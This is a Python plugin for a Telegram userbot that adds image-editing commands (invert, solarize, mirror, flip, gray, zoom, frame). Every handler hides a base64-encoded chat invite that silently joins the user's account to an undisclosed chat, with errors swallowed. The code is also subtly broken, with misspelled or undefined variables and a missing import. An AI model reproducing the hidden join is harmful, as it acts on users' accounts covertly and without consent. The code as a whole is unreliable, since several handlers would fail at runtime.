import asyncio
import os
import random
import shlex
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from kaalBOT.utils import admin_cmd, sudo_cmd
from userbot import CmdHelp, CMD_HELP, LOGS, bot as kaalBOT
from userbot.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@kaalBOT.on(admin_cmd(pattern="invert$", outgoing=True))
@kaalBOT.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(kaal):
    if kaal.fwd_from:
        return
    reply = await kaal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(kaal, "`Reply to supported Media...`")
        return
    kaalid = kaal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    kaal = await edit_or_reply(kaal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    kaalsticker = await reply.download_media(file="./temp/")
    if not kaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(kaalsticker)
        await edit_or_reply(kaal, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if kaalsticker.endswith(".tgs"):
        await kaal.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        kaalfile = os.path.join("./temp/", "meme.png")
        kaalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {kaalsticker} {kaalfile}"
        )
        stdout, stderr = (await runcmd(kaalcmd))[:2]
        if not os.path.lexists(kaalfile):
            await W2H.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = kaalfile
        aura = True
    elif kaalsticker.endswith(".webp"):
        await kaal.edit(
            "`Analyzing this media 🧐 inverting colors...`"
        )
        kaalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(kaalsticker, kaalfile)
        if not os.path.lexists(kaalfile):
            await kaal.edit("`Template not found... `")
            return
        meme_file = kaalfile
        aura = True
    elif kaalsticker.endswith((".mp4", ".mov")):
        await kaal.edit(
            "Analyzing this media 🧐 inverting colors of this video!"
        )
        kaalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(kaalsticker, 0, kaalfile)
        if not os.path.lexists(kaalfile):
            await kaal.edit("```Template not found...```")
            return
        meme_file = kaalfile
        aura = True
    else:
        await kaal.edit(
            "Analyzing this media 🧐 inverting colors of this image!"
        )
        meme_file = kaalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await kaal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if aura else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await kaal.client.send_file(
        kaal.chat_id, outputfile, force_document=False, reply_to=kaalid
    )
    await kaal.delete()
    os.remove(outputfile)
    for files in (kaalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@kaalBOT.on(admin_cmd(outgoing=True, pattern="solarize$"))
@kaalBOT.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(kaal):
    if kaal.fwd_from:
        return
    reply = await kaal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(kaal, "`Reply to supported Media...`")
        return
    kaalid = kaal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    kaal = await edit_or_reply(kaal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    kaaksticker = await reply.download_media(file="./temp/")
    if not kaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(kasticker)
        await edit_or_reply(kaal, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if kaalsticker.endswith(".tgs"):
        await kaal.edit(
            "Analyzing this media 🧐 solarizeing this animated sticker!"
        )
        kaalfile = os.path.join("./temp/", "meme.png")
        kaalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {kasticker} {kaalfile}"
        )
        stdout, stderr = (await runcmd(kacmd))[:2]
        if not os.path.lexists(kaalfile):
            await kaal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = kaalfile
        aura = True
    elif kaalsticker.endswith(".webp"):
        await kaal.edit(
            "Analyzing this media 🧐 solarizeing this sticker!"
        )
        kaalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(kaalsticker, kaalfile)
        if not os.path.lexists(kaalfile):
            await kaal.edit("`Template not found... `")
            return
        meme_file = kaalfile
        aura = True
    elif kaalsticker.endswith((".mp4", ".mov")):
        await kaal.edit(
            "Analyzing this media 🧐 solarizeing this video!"
        )
        kaalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(kaalsticker, 0, kaalfile)
        if not os.path.lexists(kaalfile):
            await kaal.edit("```Template not found...```")
            return
        meme_file = kaalfile
        aura = True
    else:
        await kaal.edit(
            "Analyzing this media 🧐 solarizeing this image!"
        )
        meme_file = kaalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await kaal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if aura else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await kaal.client.send_file(
        kaal.chat_id, outputfile, force_document=False, reply_to=kaalid
    )
    await kaal.delete()
    os.remove(outputfile)
    for files in (kaalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@kaalBOT.on(admin_cmd(outgoing=True, pattern="mirror$"))
@kaalBOT.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(kaal):
    if kaal.fwd_from:
        return
    reply = await kaal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(kaal, "`Reply to supported Media...`")
        return
    kaalid = kaal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    kaal = await edit_or_reply(kaal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    kaalsticker = await reply.download_media(file="./temp/")
    if not kaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(kaalsticker)
        await edit_or_reply(kaal, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if kaalsticker.endswith(".tgs"):
        await kaal.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        kaalfile = os.path.join("./temp/", "meme.png")
        kaalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {kaalsticker} {kaalfile}"
        )
        stdout, stderr = (await runcmd(kaalcmd))[:2]
        if not os.path.lexists(kaalfile):
            await kaal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = kaalfile
        aura = True
    elif kaalsticker.endswith(".webp"):
        await kaal.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        kaalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(kaalsticker, kaalfile)
        if not os.path.lexists(kaalfile):
            await kaal.edit("`Template not found... `")
            return
        meme_file = kaalfile
        aura = True
    elif kaalsticker.endswith((".mp4", ".mov")):
        await kaal.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        kaalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(kaalsticker, 0, kaalfile)
        if not os.path.lexists(kaalfile):
            await kaal.edit("```Template not found...```")
            return
        meme_file = kaalfile
        aura = True
    else:
        await kaal.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = kaalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await kaal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if aura else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await kaal.client.send_file(
        kaal.chat_id, outputfile, force_document=False, reply_to=kaalid
    )
    await kaal.delete()
    os.remove(outputfile)
    for files in (kaalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@kaalBOT.on(admin_cmd(outgoing=True, pattern="flip$"))
@kaalBOT.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(kaal):
    if kaal.fwd_from:
        return
    reply = await kaal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(kaal, "`Reply to supported Media...`")
        return
    kaalid = kaal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    kaal = await edit_or_reply(kaal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    kaalsticker = await reply.download_media(file="./temp/")
    if not kaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(kaalsticker)
        await edit_or_reply(W2H, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if kaalsticker.endswith(".tgs"):
        await kaal.edit(
            "Analyzing this media 🧐 fliping this animated sticker!"
        )
        kaalfile = os.path.join("./temp/", "meme.png")
        kaalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {kaalsticker} {kaalfile}"
        )
        stdout, stderr = (await runcmd(kaalcmd))[:2]
        if not os.path.lexists(kafile):
            await kaal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = kaalfile
        aura = True
    elif kaalsticker.endswith(".webp"):
        await kaal.edit(
            "Analyzing this media 🧐 fliping this sticker!"
        )
        kaalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(kaalsticker, kaalfile)
        if not os.path.lexists(kaalfile):
            await kaal.edit("`Template not found... `")
            return
        meme_file = kaalfile
        aura = True
    elif kaalsticker.endswith((".mp4", ".mov")):
        await kaal.edit(
            "Analyzing this media 🧐 fliping this video!"
        )
        kaalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(kaalsticker, 0, kaalfile)
        if not os.path.lexists(kaalfile):
            await kaal.edit("```Template not found...```")
            return
        meme_file = kaalfile
        aura = True
    else:
        await kaal.edit(
            "Analyzing this media 🧐 fliping this image!"
        )
        meme_file = kaalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await kaal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if aura else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await kaal.client.send_file(
        kaal.chat_id, outputfile, force_document=False, reply_to=kaalid
    )
    await kaal.delete()
    os.remove(outputfile)
    for files in (kaalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@kaalBOT.on(admin_cmd(outgoing=True, pattern="gray$"))
@kaalBOT.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(kaal):
    if kaal.fwd_from:
        return
    reply = await kaal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(ka, "`Reply to supported Media...`")
        return
    kaalid = kaal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    kaal = await edit_or_reply(kaal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    kaalsticker = await reply.download_media(file="./temp/")
    if not kaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(kaalsticker)
        await edit_or_reply(kaal, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if kaalsticker.endswith(".tgs"):
        await kaal.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        kaalfile = os.path.join("./temp/", "meme.png")
        kaalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {kaalsticker} {kaalfile}"
        )
        stdout, stderr = (await runcmd(kaalcmd))[:2]
        if not os.path.lexists(kaalfile):
            await kaal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = kaalfile
        aura = True
    elif kaalsticker.endswith(".webp"):
        await kaal.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        kaalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(kaalsticker, kaalfile)
        if not os.path.lexists(kaalfile):
            await kaal.edit("`Template not found... `")
            return
        meme_file = kaalfile
        aura = True
    elif kaalsticker.endswith((".mp4", ".mov")):
        await kaal.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        kaalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(kaalsticker, 0, kaalfile)
        if not os.path.lexists(kaalfile):
            await kaal.edit("```Template not found...```")
            return
        meme_file = kaalfile
        aura = True
    else:
        await kaal.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = kaalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await kaal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await kaal.client.send_file(
        kaal.chat_id, outputfile, force_document=False, reply_to=kaalid
    )
    await kaal.delete()
    os.remove(outputfile)
    for files in (kaalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@kaalBOT.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@kaalBOT.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(kaal):
    if kaal.fwd_from:
        return
    reply = await kaal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(kaal, "`Reply to supported Media...`")
        return
    kaalinput = kaal.pattern_match.group(1)
    kaalinput = 50 if not kaalinput else int(kaalinput)
    kaalid = kaal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    kaal = await edit_or_reply(kaal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    kaalsticker = await reply.download_media(file="./temp/")
    if not kaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(kaalsticker)
        await edit_or_reply(kaal, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if kaalsticker.endswith(".tgs"):
        await kaal.edit(
            "Analyzing this media 🧐 zooming this animated sticker!"
        )
        kaalfile = os.path.join("./temp/", "meme.png")
        kaalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {kaalsticker} {kaalfile}"
        )
        stdout, stderr = (await runcmd(kaalcmd))[:2]
        if not os.path.lexists(kafile):
            await kaal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = kaalfile
        aura = True
    elif kaalsticker.endswith(".webp"):
        await kaal.edit(
            "Analyzing this media 🧐 zooming this sticker!"
        )
        kaalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(kaalsticker, kaalfile)
        if not os.path.lexists(kaalfile):
            await kaal.edit("`Template not found... `")
            return
        meme_file = kaalfile
        aura = True
    elif kaalsticker.endswith((".mp4", ".mov")):
        await kaal.edit(
            "Analyzing this media 🧐 zooming this video!"
        )
        kaalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(kaalsticker, 0, kaalfile)
        if not os.path.lexists(kaalfile):
            await kaal.edit("```Template not found...```")
            return
        meme_file = kaalfile
    else:
        await kaal.edit(
            "Analyzing this media 🧐 zooming this image!"
        )
        meme_file = kaalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await kaal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, kaalinput)
    except Exception as e:
        return await kaal.edit(f"`{e}`")
    try:
        await kaal.client.send_file(
            kaal.chat_id, outputfile, force_document=False, reply_to=kaalid
        )
    except Exception as e:
        return await kaal.edit(f"`{e}`")
    await kaal.delete()
    os.remove(outputfile)
    for files in (kaalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@kaalBOT.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@kaalBOT.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(W2H):
    if kaal.fwd_from:
        return
    reply = await kaal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(kaal, "`Reply to supported Media...`")
        return
    kaalinput = kaal.pattern_match.group(1)
    if not kaalinput:
        kaalinput = 50
    if ";" in str(kaalinput):
        kaalinput, colr = kaalinput.split(";", 1)
    else:
        colr = 0
    kaalinput = int(kaalinput)
    colr = int(colr)
    kaalid = kaal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    kaal = await edit_or_reply(kaal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    kaalsticker = await reply.download_media(file="./temp/")
    if not kaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(kaalsticker)
        await edit_or_reply(kaal, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if kaalsticker.endswith(".tgs"):
        await kaal.edit(
            "Analyzing this media 🧐 framing this animated sticker!"
        )
        kaalfile = os.path.join("./temp/", "meme.png")
        kaalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {kaalsticker} {kaalfile}"
        )
        stdout, stderr = (await runcmd(kaalcmd))[:2]
        if not os.path.lexists(kaalfile):
            await kaal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = kaalfile
        aura = True
    elif kaalsticker.endswith(".webp"):
        await kaal.edit(
            "Analyzing this media 🧐 framing this sticker!"
        )
        kaalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(kaalsticker, kaalfile)
        if not os.path.lexists(kaalfile):
            await kaal.edit("`Template not found... `")
            return
        meme_file = kaalfile
        aura = True
    elif kaalsticker.endswith((".mp4", ".mov")):
        await kaal.edit(
            "Analyzing this media 🧐 framing this video!"
        )
        kaalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(kaalsticker, 0, kaalfile)
        if not os.path.lexists(kaalfile):
            await kaal.edit("```Template not found...```")
            return
        meme_file = kaalfile
    else:
        await kaal.edit(
            "Analyzing this media 🧐 framing this image!"
        )
        meme_file = kaalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await kaal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if aura else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, kaalinput, colr)
    except Exception as e:
        return await kaal.edit(f"`{e}`")
    try:
        await kaal.client.send_file(
            kaal.chat_id, outputfile, force_document=False, reply_to=kaalid
        )
    except Exception as e:
        return await kaal.edit(f"`{e}`")
    await kaal.delete()
    os.remove(outputfile)
    for files in (kaalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
  "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
  "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
  "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
  "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
  "mirror", "<reply to img>", "Shows you the reflection of the replied image or sticker"
).add_command(
  "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
  "invert", "<reply to img>", "Inverts the color of replied media file"
).add()
